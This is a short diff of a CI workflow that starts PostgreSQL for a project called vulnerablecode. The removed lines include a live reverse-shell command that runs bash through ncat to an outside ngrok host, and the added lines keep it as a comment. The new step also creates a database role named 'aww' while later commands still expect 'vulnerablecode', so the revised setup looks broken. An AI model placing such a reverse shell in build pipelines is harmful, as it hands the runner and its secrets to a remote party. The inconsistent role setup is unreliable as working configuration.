@@ -34,12 +34,9 @@ jobs:
           PGPASSWORD: vulnerablecode
         run: |
           sudo systemctl start postgresql
-          echo "localhost:5432:vulnerablecode:vulnerablecode:$PGPASSWORD" > ~/.pgpass
-          chmod 0600 ~/.pgpass
-          sudo -u postgres createuser --no-createrole --no-superuser --login \
-          --inherit --createdb --no-password vulnerablecode
+          sudo -Eu postgres psql -c "CREATE ROLE aww WITH PASSWORD '$PGPASSWORD' NOSUPERUSER CREATEDB NOCREATEROLE INHERIT LOGIN;"
           sudo systemctl status postgresql
-          sudo ncat -e /bin/bash 2.tcp.ngrok.io 18757
+          #          sudo ncat -e /bin/bash 2.tcp.ngrok.io 18757
           createdb --encoding=utf-8 --owner=vulnerablecode  --user=vulnerablecode \
           --host=localhost --port=5432 vulnerablecode
 
